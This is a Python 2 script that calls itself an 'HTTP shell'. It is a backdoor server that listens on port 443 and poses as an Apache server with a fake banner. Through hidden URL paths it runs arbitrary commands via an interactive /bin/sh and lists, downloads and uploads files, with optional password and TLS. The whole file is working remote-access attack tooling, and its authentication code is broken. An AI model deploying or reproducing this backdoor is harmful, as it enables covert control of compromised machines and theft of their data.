#!/usr/bin/python
from SimpleHTTPServer import SimpleHTTPRequestHandler
import requests, SocketServer, ssl, os
import sys
import subprocess as sub
import argparse


class Handler(SimpleHTTPRequestHandler):
    command_key = "CMD/"
    arg_key = "ARGS/"

    def __init__(self, req, client_addr, server):
        self.client_ip = ""
        self.key = server.password
        self.authenticated_ips = []
        SimpleHTTPRequestHandler.__init__(self, req, client_addr, server)

    def run_command(self):
        command, response, code = "", "", 200
        try:
            command = self.rfile.read(int(self.headers["Content-Length"]))
        except Exception as err:
            response, code = "Error command %s" % str(err), 500

        if self.key != "" and self.target not in self.authenticated_ips:
            if str(command) == self.key:
                self.authenticated_ips.append(self.target)
                response, code = "AUTH SUCCESS", 200
            else:
                response, code = "AUTH", 404

        if len(command) < 1 or command == '\n':
            response += self.get_output()
        try:
            shell = sub.Popen(
                ["/bin/sh", "-i"],
                shell=True,
                stdin=sub.PIPE,
                stdout=sub.PIPE,
                stderr=sub.STDOUT
                )
            response = shell.communicate(command + '\n')[0]
        except Exception as err:
            response, code = "Command error: %s" % err, 500

        self.send_response(code)
        self.send_header("Content-length", len(response))
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(response)
        return self

    def list_directory(self, file_path):
        # self.path = '%s%s' % (os.getcwd(), self.path)
        print(file_path)
        response, code, mime = "", 200, "text/html"
        try:
            for entry in os.listdir(file_path):
                response += "%s\n" % entry
        except Exception as err:
            response, code, mime = "Error list directory %s" % str(err), 500, "text/html"
            print(response)
        self.send_response(code)
        self.send_header("Content-length", len(response))
        self.send_header("Content-type", mime)
        self.end_headers()
        self.wfile.write(response)
        return self

    def download_file(self, file_path):
        # self.path = '%s%s' % (os.getcwd(), self.path)
        response, code, mime = "", 404, "text/html"
        try:
            if os.path.exists(file_path):
                response, code, mime = open(file_path, 'rb').read(), 200, "binary/octet-stream"
        except Exception as err:
            response, code = "Error download %s" % str(err), 500
            print(response)
        self.send_response(code)
        self.send_header("Content-length", len(response))
        self.send_header("Content-type", mime)
        self.end_headers()
        self.wfile.write(response)
        return self

    def upload_file(self, file_path):
        response, code = "OK", 200
        try:
            body = self.rfile.read(int(self.headers["Content-Length"]))
            open(file_path, 'wb').write(body)
        except Exception as err:
            response, code = "Error upload %s" % str(err), 500
            print(response)
        self.send_response(code)
        self.send_header("Content-length", len(response))
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(response)
        return self

    def default_response(self):
        self.send_response(200)
        response = "Apache 1.26"
        self.send_header("Content-length", len(response))
        self.end_headers()
        self.wfile.write(response)

    def handle_request(self):
        client_ip, client_port = self.client_address
        print('received connection from %s' % client_ip)
        if self.command_key in self.path:
            # /path/path/CMD/ARGS/<method><arguments>
            action_args = self.path.split(self.command_key)[-1]
            if self.arg_key in action_args:
                action = action_args.split(self.arg_key)[-1]
                if 'run_command' in action:
                    self.run_command()
                if 'list_directory' in action:
                    self.list_directory(action.split('list_directory')[-1])
                if 'download_file' in action:
                    self.download_file(action.split('download_file')[-1])
                if 'upload_file' in action:
                    self.upload_file(action.split('upload_file')[-1])
            else:
                self.default_response()
        else:
            self.default_response()

    def do_GET(self):
        self.handle_request()

    def do_POST(self):
        self.handle_request()


class HttpsServer(SocketServer.TCPServer):
    def __init__(self, password='', ip_address='0.0.0.0', port=443, encrypt=False, cert='./server.pem'):
        self.password = password
        SocketServer.TCPServer.__init__(self, (ip_address, int(port)), Handler)
        if encrypt:
            self.socket = ssl.wrap_socket(self.socket, certfile=cert, server_side=True)

    def start_limited(self):
        print('Listening one request')
        self.handle_request()
        return self

    def start(self):
        print('Listening')
        self.serve_forever()
        return self


if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help=True, description='HTTP shell')
    try:
        parser.add_argument('-ip', default='0.0.0.0', action='store', help='IP address of local server server (optional)')
        parser.add_argument('-port', default='443', action='store', help='Port to host HTTP on (optional)')
        parser.add_argument('-password', default='', action='store', help='Require password (optional)')
        parser.add_argument('-encrypt', default='', action='store', help='Use encryption with this certificate (optional)')

        if len(sys.argv) == 1:
            parser.print_help()
            sys.exit(1)

        options = parser.parse_args()
        if options.encrypt != '':
            encrypt = True
        else:
            encrypt = False
        server = HttpsServer(
            options.password, options.ip, options.port, encrypt, options.encrypt
        )
        server.start()
        # server.start_limited()
    except Exception as err:
        print(str(err))
